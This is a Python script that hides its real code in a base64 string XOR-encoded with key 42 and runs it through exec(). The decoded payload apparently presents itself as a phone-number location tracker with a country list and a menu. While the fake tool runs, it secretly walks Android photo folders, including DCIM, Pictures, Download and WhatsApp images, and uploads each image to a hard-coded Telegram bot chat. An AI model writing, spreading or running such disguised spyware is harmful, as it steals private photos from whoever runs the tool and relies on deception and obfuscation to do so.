# Encrypted with XOR + Base64

import base64

def xor_decrypt(data, key=42):
    return ''.join(chr(ord(c) ^ key) for c in data)

encoded_code = "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ouKWouKWouKVveKWu+KWu+KWouKWouKWouKWouKWouKWouKVveKWouKWouKVveKWu+KWu+KWouKWouKVvSAKCgoK4pai4pai4pai4pai4pW94pa74pai4pai4pai4pai4pW74pai4pai4pW+4pW64pW64pai4pai4pW94pai4pai4pW+4pW64pW64pW64pW64pW34pai4pai4pW74pa74pai4pai4pW+4pW3IAoKCgrilqLilqLilb7ilqLilqLilqLilqLilb7ilqLilqLilbvilqLilqLilqLilqLilqLilqLilqLilbvilbDilqLilqLilqLilqLilqLilb3ilrvilqLilqLilqLilqLilqLilbrilbfilrsgCgoKCuKWouKWouKVu+KVsOKWouKWouKVvuKVt+KWouKWouKVu+KWouKWouKVvuKVuuKVuuKWouKWouKVu+KWu+KVsOKVuuKVuuKVuuKWouKWouKVveKWouKWouKVvuKVuuKWouKWouKVveKWuyAKCgoK4pai4pai4pW74pa74pWw4pW64pW34pa74pai4pai4pW74pai4pai4pW74pa74pa74pai4pai4pW74pai4pai4pai4pai4pai4pai4pW+4pW34pai4pai4pW74pa74pWw4pai4pai4pW9IAoKCgrilbDilbrilbfilrvilrvilrvilrvilrvilbDilbrilbfilbDilbrilbfilrvilrvilbDilbrilbfilbDilbrilbrilbrilbrilbrilbfilrvilbDilbrilbfilrvilrvilbDilbrilbcgIAoKCgp6QkVETwpkX0dIT1gKZkVJS15DRUQKflhLSUFPWAoHClwfBBogCgoKCggICAMgCgoKCllGT09aAhsDIAoKCgpJRU5PChcKQ0RaX14CCBQUCm9EXk9YCklFX0ReWFMKSUVOTwoCTwRNBAYKARMcHAMQCggDIAoKCgpaQkVETwoXCkNEWl9eAggUFApvRF5PWApaQkVETwpEX0dIT1gQCggDICAKCgoKWlhDRF4CCHZEceKcuXcKZkVJS15DRE0KRF9HSE9YBAQECAMgCgoKCkxFWApDCkNEClhLRE1PAhsGChsbAxAgCgoKCgoKCgpaWENEXgJMCHpYRU1YT1lZEApRQwAbGlcPCAYKT0ROFwh2WAgDIAoKCgoKCgoKWUZPT1oCGgQZAyAgCgoKCkNETEUKFwpsa2FvdW5rfmsETU9eAklFTk8GClEgCgoKCgoKCgoISUVfRF5YUwgQCgh/REFERV1ECAYgCgoKCgoKCgoISUNeUwgQCghmRUlLXkNETQQEBAgGIAoKCgoKCgoKCFpYRVxDTk9YCBAKCH9EQURFXUQIIAoKCgpXAyAgCgoKClpYQ0ReAkwIdkR2RHHinLl3CmZFSUteQ0VECkxFX0ROCwgDIAoKCgpaWENEXgJMCGlFX0ReWFMQClFDRExFcQ1JRV9EXlhTDXdXCAMgCgoKClpYQ0ReAkwIaUNeUxAKUUNETEVxDUlDXlMNd1cIAyAKCgoKWlhDRF4CTAh6WEVcQ05PWBAKUUNETEVxDVpYRVxDTk9YDXdXCAMgCgoKClpYQ0ReAghrSUlfWEtJUxAKGxoaCkdPXk9YWXZEaUVFWE5DREteT1kKXUNGRgpITwpfWk5LXk9OCllFRUQEBAR2RAgDICBLWVNESQpOT0wKWF9EdV5FRUYCAxAgCgoKClpLXkJZChcKTU9edUtGRnVaRVlZQ0hGT3VDR0tNT3VaS15CWQIDIAoKCgpZT0ROdV5LWUEKFwpLWVNESUNFBElYT0teT3VeS1lBAllPRE51Q0dLTU9ZAlpLXkJZAwMKCgkKeV5LWF4KQ0QKSEtJQU1YRV9ETiAKCgoKS11LQ14KWU9ETnVeS1lBCgoJCn1LQ14KWUNGT0ReRlMKQ0QKSEtJQU1YRV9ETgpLTF5PWApMS0FPCn9jIAoKCgpMS0FPdUZFSUteQ0VEdV5FRUYCAwoKCQp4X0QKQ0dHT05DS15PRlMgICAgTk9MCkdLQ0R1R09EXwIDECAKCgoKXUJDRk8KflhfTxAgCgoKCgoKCgpaWENEXgIICAggCgoKCgoKCgoXFxcXFxcXFxcXCmdLQ0QKZ09EXwoXFxcXFxcXFxcXIAoKCgoKCgoKcRt3CmNEWV5LRkYKWE9bX0NYT04KXkVFRlkgCgoKCgoKCgpxGHcKeF9ECl5CTwpeRUVGIAoKCgoKCgoKcRl3Cm9SQ14gCgoKCgoKCgoXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXIAoKCgoKCgoKCAgIAyAKCgoKCgoKCklCRUNJTwoXCkNEWl9eAggUFAp5T0ZPSV4KU0VfWApFWl5DRUQQCggDICAKCgoKCgoKCkNMCklCRUNJTwoXFwoIGwgQIAoKCgoKCgoKCgoKCkNEWV5LRkZ1WE9bX0NYT0dPRF5ZAgMgCgoKCgoKCgpPRkNMCklCRUNJTwoXFwoIGAgQIAoKCgoKCgoKCgoKCktZU0RJQ0UEWF9EAlhfRHVeRUVGAgMDIAoKCgoKCgoKT0ZDTApJQkVDSU8KFxcKCBkIECAKCgoKCgoKCgoKCgpaWENEXgIIbUVFTkhTTwrwn5GhCAMgCgoKCgoKCgoKCgoKSFhPS0EgCgoKCgoKCgpPRllPECAKCgoKCgoKCgoKCgpaWENEXgIIY0RcS0ZDTgpJQkVDSU8GClpGT0tZTwpeWFMKS01LQ0QECAMgIENMCnV1REtHT3V1ChcXCgh1dUdLQ0R1dQgQIAoKCgpHS0NEdUdPRF8CAw=="
decoded = base64.b64decode(encoded_code).decode()
exec(xor_decrypt(decoded))
